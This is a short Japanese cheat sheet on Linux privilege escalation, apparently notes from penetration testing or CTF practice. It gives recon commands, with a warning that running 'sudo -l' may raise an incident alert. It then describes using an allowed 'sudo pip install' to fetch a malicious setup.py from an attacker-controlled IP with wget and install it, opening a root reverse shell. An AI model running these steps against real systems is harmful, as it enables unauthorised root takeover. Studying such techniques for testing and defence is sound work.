# 権限昇格

## 情報収集

### 特定ユーザーが所有するファイル一覧

```shell
find / -user <name> 2>/dev/null
```

### 現在のユーザーが使えるシステムコマンドを調べる

権限のないユーザーが実行するとインシデント通知が出る可能性があるので注意！

```shell
sudo -l
```

## sudo pip install が許可されている場合

不正な setup.py を使うことで、root でリバースシェルの起動が可能  
https://github.com/0x00-0x00/FakePip/tree/master

```shell
wget http://<ip>/setup.py
sudo pip install . --upgrade
```

ユーザーごとに

```shell
pip install --user
```

## セキュリティ視点

- 悪意を持つ者に何かしらの sudo 権限を与えたら、root を取られると思った方が良い
